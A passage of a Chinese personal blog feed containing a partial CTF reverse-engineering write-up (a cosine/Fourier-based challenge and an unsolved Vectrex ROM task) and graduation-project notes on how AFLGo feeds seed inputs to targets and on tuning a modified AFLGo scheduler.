<code>\dev\urandom</code>每一次产生的随机数都是不一样的，所以我们只能是根据程序回显出来的v6中的内容反推buf。</p><p>在执行想法的过程中遇到了阻碍，在主逻辑的第二步中，参与运算的部分数据同样来源于 <code>\dev\urandom</code>。这样我就没办法通过 <code>v6的内容</code>根据运算过程推算出参与运算的 <code>int_64 buf[j]--8个字节的内容</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v24 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v25 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v26 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v27 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v28 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v29 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v30 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v31 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v32 <span class="token operator">=</span> result<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  v11 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v24<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a2<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span>          <span class="token punctuation">(</span><span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">*</span> <span class="token number">0.00000390625</span>        <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i        <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v25<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a3      <span class="token operator">+</span> v11<span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">3.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v26<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a4      <span class="token operator">+</span> v12<span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">4.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v27<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a5      <span class="token operator">+</span> v13<span class="token punctuation">;</span>  v15 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">5.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v28<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a6      <span class="token operator">+</span> v14<span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">6.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v29<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a7      <span class="token operator">+</span> v15<span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">7.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v30<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a8      <span class="token operator">+</span> v16<span class="token punctuation">;</span>  v18 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">8.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v31<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a9      <span class="token operator">+</span> v17<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> v18 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">8LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v32 <span class="token operator">+</span> v10<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我有猜测，是否在 <code>cos参与的运算</code>中可以把相关的随机因素给消除掉。观察了很长时间，也没发现其中蕴含的数学法则可以把随机的因素给消除掉。</p><h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><p>居然涉及到数学的傅里叶级数，这真的是完全没有想到的。</p><p>大体思路就是通过傅里叶级数的不同形式，忽略掉随机的部分，只求振幅。振幅就是<code>buf[j]</code>。咱是实在没耐心看着一堆数学公式。</p><p><a href="https://hackmd.io/@vishiswoz/rkSNRg8Zo#">writeup</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220920151256.png" alt="writeup图片"></p><h2 id="vintage-part1—未完成"><a href="#vintage-part1—未完成" class="headerlink" title="vintage - part1—未完成"></a>vintage - part1—未完成</h2><h3 id="自己-1"><a href="#自己-1" class="headerlink" title="自己"></a>自己</h3><p>用linux下的file工具分析了一下，显示其是 <code>Vectrex ROM image</code>。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918161455.png" alt="Vectrex ROM"></p><p>我找了很长时间的模拟器，想要找一个模拟器模拟运行这个镜像文件。找了半天，找到了一个在线版本的。把这个二进制文件直接拖进去就可以运行。</p><p><a href="https://drsnuggles.github.io/jsvecx/">https://drsnuggles.github.io/jsvecx/</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918173202.png" alt="运行结果"></p><p>泥马8位密码，大写字母+数字+符号。呜呜呜，然后我试着在二进制文件中找了一下字符串，如果游戏密码是明文存放的话，应该是可以找到的。</p><p>结果就是没找着。。。。</p><p>我又想着根据这个game的文件格式—通过对比网上的这种游戏发现它们都是 <code>.vec结尾的</code>去逆推源码。在网上搜了半天也没发现相关。真是无语~~~</p><p>:&gt; :&gt; :&gt; :&gt;</p><p>最终找到了一个vectrexy工具链接如下，倒是可以调试了，但是这里面代码啥的看不懂呢！</p><p><a href="https://github.com/amaiorano/vectrexy">https://github.com/amaiorano/vectrexy</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919100935.png" alt="vectrexy"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>😔😔😔😔</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-6</title>
      <link href="/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/"/>
      <url>/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/</url>
      
        <content type="html"><![CDATA[<h1 id="AFL种子文件是如何送入目标程序的？"><a href="#AFL种子文件是如何送入目标程序的？" class="headerlink" title="AFL种子文件是如何送入目标程序的？"></a>AFL种子文件是如何送入目标程序的？</h1><p>在做实验的过程中，因为要复现漏洞嘛，要把种子文件送入目标程序。这里产生了一个疑问</p><p><strong>如果我用重定向的方式把种子文件(二进制文件)送入目标程序中，那么目标程序会显示相应的报错。但是如果我将二进制文件的内容(使用xxd)复制下来，然后在送入程序中，目标程序就不会报错。</strong></p><p>在小刘的启发下，我开始对照源码，观察AFL是如何把种子文件送入目标程序。</p><p>得到的结论就是，AFL是采用重定向的方式将种子文件送入目标程序的。</p><hr><ol><li>首先是启动参数中含有@@的(目标程序接受<strong>文件名</strong>，作为输入参数)</li></ol><p><em><strong><code>@@</code>本身代表的就是运行xmllint过程中，需要送进去的文件名</strong></em></p><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out ./xmllint --valid --recover @@</code></p><p>AFL会找到<code>@@</code>的位置，然后把<code>@@</code>替换成<strong>out/.cur_input</strong>。并且指定<code>out_file</code>为。<code>out/.cur_input</code>。</p><p>具体细节可以参照函数 <code>detect_file_args</code></p><ol start="2"><li>然后是启动参数中不包含@@的(目标程序接受<strong>标准输入</strong>作为输入参数)</li></ol><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out binutils/cxxfilt</code></p><p>AFL会创建<code>cur_input</code>文件，然后把<code>out_fd</code>作为<code>.cur_input</code>的文件描述符</p><p>具体细节参照函数<code>setup_stdio_file</code></p><ol start="3"><li>紧接着会运行<code>perform_dry_run(..)</code>执行 input 文件夹下的预先准备的所有测试用例</li></ol><ol start="4"><li><code>perform_dry_run(..)</code>的循环里面会调用<code>calibrate_case(...)</code></li></ol><ol start="5"><li><code>calibrate_case(...)</code>在没有启动fork server的时候，会调用  <code>init_forkserver(argv)</code></li></ol><ol start="6"><li><code>init_forkserver(argv)</code>中的子进程会进行重定向</li></ol>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 如果指定了out_file，则标准输入重定向到dev_null_fd，否则重定向到out_fd</span><span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  到此，也就是接受文件名作为参数的，会把标准输入重定向为NULL。接受标准输入作为参数的，回把out_fd指向的文件内容以标准输入的形式输入到程序中。</p><hr><p>特别说明，在每一次fuzz的过程中。AFL都会调用类似于<code>write_to_testcase</code>的函数，将新的变异过的文件内容，写入<code>out_file</code>中，并清楚原来的内容。</p><p>在fuzz的过程中，用到哪个种子文件就打开哪个，然后把种子文件的内容复制到<code>.cur_input</code>文件里面, 再对 <code>.cur_input</code>文件中内容进行 位翻转等一系列变异操作，同时观察是否可以保留下来。如果能保留下来，就保留。不能保留就进行下面的变异步骤。之后循环往复。 </p><h2 id="为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致"><a href="#为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致" class="headerlink" title="为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致"></a>为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致</h2><p><code>xxd</code>看到的是ASCII码，ASCII码一共就只有128个，也就是从<code>0x 00 - 0x 7F</code>。超过这个范围的编码，在xxd命令里面一律显示为<code>.</code>。 除此之外，还有一些控制码，比如退格(Backspace)、回车(Enter)等等，同样也会被显示为<code>.</code>。</p><p>所以你使用xxd看到的内容和重定向到标准输入得到的内容肯定是不一致的。 那你把看到的内容复制出来，然后再送给程序后，显示的结果 肯定 和重定向送入程序显示的结果 不一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422102811.png" alt="xxd"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422103118.png" alt="ASCII"></p><h2 id="那重定向是输入的什么呢？以什么方式输入的呢？"><a href="#那重定向是输入的什么呢？以什么方式输入的呢？" class="headerlink" title="那重定向是输入的什么呢？以什么方式输入的呢？"></a>那重定向是输入的什么呢？以什么方式输入的呢？</h2><p>一般来说接受标准输入的程序，会使用getchar()来获取标准输入的内容。</p><p>我就用做了一个测试, 发现显示不了的就是按二进制输入的估计。反正到程序里面之后都是以二进制的方式在判断。他只是没有对应的字符显示罢了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422105756.png" alt="测试"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">char</span> mbuffer<span class="token punctuation">[</span><span class="token number">32767</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> c<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mbuffer<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>mbuffer<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码修改.md</title>
      <link href="/2022/02/25/bi-she-fuzz-aflgo-yuan-ma-xiu-gai-1/"/>
      <url>/2022/02/25/bi-she-fuzz-aflgo-yuan-ma-xiu-gai-1/</url>
      
        <content type="html"><![CDATA[<h1 id="效率提升"><a href="#效率提升" class="headerlink" title="效率提升"></a>效率提升</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>最初就是把算法跑通了，然后也没有什么bug了。</p><blockquote><p><strong>效果可以说是惨不忍睹</strong>, 跑三个半小时，还不如AFLGo跑十几分钟。</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220304205907.png" alt="1"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>在fuzz_one中是有概率跳过代码的。我把这部分概率跳过的代码限制<strong>只在无差别探索阶段使用</strong>，效率提升了一些，但还远没有达到想要的效果。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220304210159.png" alt="2"></p><p>既然这样的话，我又想着，应该是把概率跳过的代码限制在 <strong>无差别探索阶段</strong> 和 <strong>短路径优先阶段</strong> 都使用才对。</p><blockquote><p>这样的效果也一般，跟上面的差不多。</p></blockquote><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>先从select_the_shortest开始优化,先优化寻找fuzz过的和没有fuzz过的。 </p><p>用新的指针 temp_queue_fuzzed在第一遍循环的时候，就找到的已经被fuzzed过的种子。</p><p>直接把所有的handle函数都更换了，顺便修改if语句的条件控制，尽量让条件尽可能的为真。–<strong>但是真并不意味着一定是你想要的</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220305112237.png" alt="3"></p><blockquote><p>longest和shortest_longest两个阶段运行的次数太少，速度也很慢。 尤其是那个trim阶段，stage execs后面那个数很大。会有700多或者是800多。</p></blockquote><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>鉴于，之前的算法非常慢。而且没有完全符合论文中的描述。所以我决定重新设计算法。</p><p>在算法的编写过程中，尤其是复用其他函数中的代码段时，总是会出现一些变量名忘记更改的问题。导致出现访问空指针的情况。(段错误)</p><p>还有，在加入队列(<code>add_to_queue</code>)的时候，对最大最小值进行判定没有问题。 可是我忽略了，在队列(<code>calibrate_case</code>)当中进行最大和最小值的更替。</p><p>我dnmd，速度上确实是快了一些，但是效率上咋变低了呢？</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220306142106.png" alt="4"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>把论文中描述的在短路径优先阶段中，给予种子最大的能量给加进去了。效果依然不是很好。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220306153337.png" alt="5"></p><h3 id="验证crash"><a href="#验证crash" class="headerlink" title="验证crash"></a>验证crash</h3><p>pwndebug</p><p>即使是用正常的afl-fuzz跑出来的, 依然也只是有问题的输入样例。并不能产生像之前说的那种崩溃。 这种crash是如何计算的呢？</p><h3 id="下一步思路"><a href="#下一步思路" class="headerlink" title="下一步思路"></a>下一步思路</h3><p>下一步:</p><ul><li><p>继续优化短路径优先阶段。提高这个阶段的效率。</p></li><li><p>增加没有最短路径/最大基本块数的情况， 就是种子的值都还是-1的情况。</p></li><li><p>第二轮的效果，远远没有第一轮的效果好。</p></li></ul><p><strong>还有一个想法，我觉得我甚至可以把AFLGo的原理都写到毕业论文中。包括编译插桩是如何进行的，在运行的时候又是如何体现出来的。甚至包括forkserver与主进程之间的切换等等。</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220313105014.png" alt="5.2"></p><blockquote><p>图片当中的54个crash甚至都是第一轮跑出来的。 想一想为什么第二轮的效果远远不如第一轮呢？</p></blockquote><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>把短路径优先阶段的概率跳过给删去，再试一试。 —-但是这个好像不解决，第二轮的问题呀！</p><p>在最长的路径里面挑选最短的，又是段错误，我不知道为什么？？</p><p>这样把，明天把时间管理的指针重新写一下。 尽量就是不要让他第一次就进入到第一个循环里面去。</p><h3 id="为什么queue-max-bb-和queue-min-distance-有的时候为空指针？"><a href="#为什么queue-max-bb-和queue-min-distance-有的时候为空指针？" class="headerlink" title="为什么queue_max_bb 和queue_min_distance 有的时候为空指针？"></a>为什么queue_max_bb 和queue_min_distance 有的时候为空指针？</h3><p>因为下面这些代码—**has_new_bits()**函数里面的</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (*total_count &gt; 0) &#123;  cur_distance &#x3D; (double)(*total_distance) &#x2F; (double)(*total_count);  cur_bb &#x3D; (double)(*total_count);&#125;else&#123;  cur_distance &#x3D; -1.0;  cur_bb &#x3D; -1.0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以看到只有在 <strong>total_count &gt; 